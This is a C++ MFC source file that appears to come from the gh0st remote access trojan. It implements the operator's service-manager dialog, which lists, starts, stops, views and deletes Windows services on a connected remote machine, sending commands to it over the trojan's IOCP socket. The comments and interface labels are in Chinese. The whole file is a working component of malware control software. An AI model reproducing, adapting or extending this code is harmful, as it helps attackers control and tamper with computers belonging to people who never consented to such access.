// ServersDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "ServersDlg.h"
#include "SerAttribDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CServersDlg dialog

struct ServersMSG{             //描述服务的消息
	BYTE Sername[MAX_PATH/4];  //服务名
	BYTE Serdes[MAX_PATH/2];   //显示的服务
	BYTE serdis[MAX_PATH];     //服务描述
	BYTE Serpath[MAX_PATH];    //服务路径
	BOOL  isrun;               //是否在运行  1停止,2运行,3暂停,4其他 
	BOOL  fanshi;              //启动方式     1自动,2禁止,3引导,4手动,5系统,6未知
	BOOL  sys;                 //登陆方式       1 本地系统 2  网络系统
};

CServersDlg::CServersDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CServersDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CServersDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = AfxGetApp()->LoadIcon(IDI_SER_ICON);
	indexed=counted=-1;
	config="";
	serverCount=0;
}


void CServersDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CServersDlg)
	DDX_Control(pDX, IDC_LIST, m_list);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CServersDlg, CDialog)
	//{{AFX_MSG_MAP(CServersDlg)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST, OnRclickList)
	ON_COMMAND(IDM_SER_FLUSH, OnSerFlush)
	ON_COMMAND(IDM_SER_START, OnSerStart)
	ON_COMMAND(IDM_SER_STOP, OnSerStop)
	ON_COMMAND(IDM_SER_ATTRIB, OnSerAttrib)
	ON_COMMAND(IDM_SER_DEL, OnSerDel)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CServersDlg message handlers
BOOL CServersDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s -服务管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
    
	size[0]=75;size[1]=100;size[2]=350;size[3]=size[4]=size[5]=60;
    m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0,"服务名称",LVCFMT_LEFT,size[0]);
	m_list.InsertColumn(1,"服务显示名称",LVCFMT_LEFT,size[1]);
	m_list.InsertColumn(2,"服务描述",LVCFMT_LEFT,size[2]);
	m_list.InsertColumn(3,"服务状态",LVCFMT_LEFT,size[3]);
	m_list.InsertColumn(4,"启动方式",LVCFMT_LEFT,size[4]);
    m_list.InsertColumn(5,"登陆身份",LVCFMT_LEFT,size[5]);
	m_list.InsertColumn(6,"服务路径",LVCFMT_LEFT,1);//在属性里显示
	m_image.Create(20, 20,ILC_COLOR32,1, 1);
	m_image.SetBkColor(RGB(255,255,255));
	m_image.Add(m_hIcon);
	m_list.SetImageList(&m_image, LVSIL_SMALL);
	CreatStatusBar();
	ShowServersList();
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;
	MoveWindow(&rect,true);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CServersDlg::OnReceiveComplete()
{
	//BYTE b=m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0];
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SERVERS:
		ShowServersList();
		break;
	case TOKEN_SERVERS_OK:
		if(counted==-100){               //删除指定条目
			m_list.DeleteItem(indexed);
		}
		if(indexed>-1&&counted>-1){
			m_list.SetItemText(indexed,counted,config);
			
		}
		indexed=counted=-1;
		break;
		
		
	}
}

void CServersDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}

void CServersDlg::ShowServersList()
{
	ServersMSG  msg;
	int size=sizeof(msg);
	char	*buf = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	int count=(m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1)/size;
	
	m_list.DeleteAllItems();
	serverCount=0;
   for(int j=0;j<count;j++){
		memcpy((void*)&msg,buf+j*size,size);
		/*msg.fanshi;
		msg.isrun;
		msg.Serdes;
		msg.Sername;
		msg.Serpath;*/
		
		m_list.InsertItem(j,(char *)msg.Sername,0);         //服务名
		m_list.SetItemText(j,1,(char *)msg.Serdes);        //显示名
		m_list.SetItemText(j,2,(char *)msg.serdis);        //描述
		
		CString str;
		switch(msg.isrun){ //是否在运行  1停止,2运行,3暂停,4其他 
		case 1:
			str="停止";
			break;
		case 2:
			str="运行";
			break;
		case 3:
			str="暂停";
            break;
		case 4:
			str="其他";
			break;
		}
        m_list.SetItemText(j,3,str);
		str.Format("%s","");
		switch(msg.fanshi){   //启动方式     1自动,2禁止,3引导,4手动,5系统,6未知
		case 1:
			str="自动";
			break;
		case 2:
			str="禁止";
			break;
		case 3:
			str="引导";
			break;
		case 4:
			str="手动";
			break;
		case 5:
			str="系统";
			break;
		case 6:
			str="未知";
			break;
			
		}
		m_list.SetItemText(j,4,str);
		str.Format("%s","");
		if(msg.sys==1){
			m_list.SetItemText(j,5,"本地系统");
		}else{
			m_list.SetItemText(j,5,"网络系统");
		}
		m_list.SetItemText(j,6,(char*)msg.Serpath);
		serverCount++;
		
	}
	
	CString str;
	str.Format("%d",serverCount);
	m_wndStatusBar.SetPaneText(0,str);
}

// 创建状态条
static UINT indicators[] =
{
	ID_SEPARATOR
};
void CServersDlg::CreatStatusBar()
{
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return ;      // fail to create
	}
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, 120);
	
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏		
	CRect rc;
	::GetWindowRect(this->m_hWnd,rc);
	//rc.top=rc.bottom-30;
	m_wndStatusBar.MoveWindow(rc);
	
	CString str;
	str.Format("%d",serverCount);
	m_wndStatusBar.SetPaneText(0,str);
}

void CServersDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if(m_list.m_hWnd==NULL)return;
    CRect dlgrc;
    dlgrc.top=dlgrc.left=0;
	dlgrc.right=cx;
	dlgrc.bottom=cy-20;
    m_list.MoveWindow(dlgrc);
    m_list.SetColumnWidth(0,LVSCW_AUTOSIZE);
	double dcx=cx;
	for(int i=0;i<6;i++){
		double dd=size[i];
		dd/=710;
			     dd*=dcx;
				 int lenth=dd;
				 m_list.SetColumnWidth(i,(lenth));
	}
	
	if(m_wndStatusBar.m_hWnd!=NULL){
		CRect rc;
		
		rc.top=cy-20;
		rc.left=0;
		rc.right=cx;
		rc.bottom=cy;
		m_wndStatusBar.MoveWindow(rc);
	  }
}

void CServersDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	int index=m_list.GetSelectionMark();
	if(index<0)return;
	CMenu	popup;
	popup.LoadMenu(IDR_SERVERS_MENU);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
    
	CString str=m_list.GetItemText(index,3);
	if(str==_T("停止")){
		pM->EnableMenuItem(2,  MF_BYPOSITION | MF_GRAYED);   
	}else
		pM->EnableMenuItem(1,  MF_BYPOSITION | MF_GRAYED);   
	
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}

//刷新服务
void CServersDlg::OnSerFlush() 
{
	// TODO: Add your command handler code here
	BYTE bToken = COMMAND_SERVERS_INFO;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

//启动服务
void CServersDlg::OnSerStart() 
{
	// TODO: Add your command handler code here
	int index=m_list.GetSelectionMark();
	CString name=m_list.GetItemText(index,0);
	int size=name.GetLength()+2;
	BYTE *buf=new BYTE[size];
	ZeroMemory(buf,size);
    //写入 标记
	indexed=index;
	counted=3;
	config="运行";
	//
	buf[0]=COMMAND_SERVERS_START;
	memcpy(buf+1,name.GetBuffer(0),size-1);
	m_iocpServer->Send(m_pContext, buf, size);
	delete[] buf;
}

//停止服务
void CServersDlg::OnSerStop() 
{
	// TODO: Add your command handler code here
	int index=m_list.GetSelectionMark();
	CString name=m_list.GetItemText(index,0);
	int size=name.GetLength()+2;
	BYTE *buf=new BYTE[size];
	ZeroMemory(buf,size);
    //写入 标记
	indexed=index;
	counted=3;
	config="停止";
	//
	buf[0]=COMMAND_SERVERS_STOP;
	memcpy(buf+1,name.GetBuffer(0),size-1);
	m_iocpServer->Send(m_pContext, buf, size);
	delete[] buf;
}

//属性
void CServersDlg::OnSerAttrib() 
{
	// TODO: Add your command handler code here
	int index=m_list.GetSelectionMark();
	CString restr,restr2;
    CSerAttribDlg *dlg=new CSerAttribDlg;
	dlg->Create(IDD_SER_ATTRIB_DLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	//dlg.SetParent(GetDesktopWindow());
	dlg->m_name=m_list.GetItemText(index,0);          //名称
	dlg->m_showname=m_list.GetItemText(index,1);      //显示
	dlg->m_miaoshu=m_list.GetItemText(index,2);         //描述

	if(m_list.GetItemText(index,4)=="自动"){
		dlg->count=2;
	}else if(m_list.GetItemText(index,4)=="手动"){
		dlg->count=1;
	}else
		dlg->count=0;
	dlg->index=index;
	dlg->m_path=m_list.GetItemText(index,6);
	dlg->init(&indexed,&counted,&config,m_iocpServer,m_pContext);

}

//删除指定服务
void CServersDlg::OnSerDel() 
{
	// TODO: Add your command handler code here
	CString restr1,restr2;
	restr1="确认要删除此服务？";
    restr2="确认";
	if(MessageBox(restr1,restr2,MB_YESNO)!=IDYES){
		return;
	}
    int index=m_list.GetSelectionMark();
	CString name=m_list.GetItemText(index,0);
	int size=name.GetLength()+2;
	BYTE *buf=new BYTE[size];
	ZeroMemory(buf,size);
    //写入 标记
	indexed=index;
	counted=-100;
	config="";
	//
	buf[0]=COMMAND_SERVERS_DEL;
	memcpy(buf+1,name.GetBuffer(0),size-1);
	m_iocpServer->Send(m_pContext, buf, size);
	delete[] buf;
}
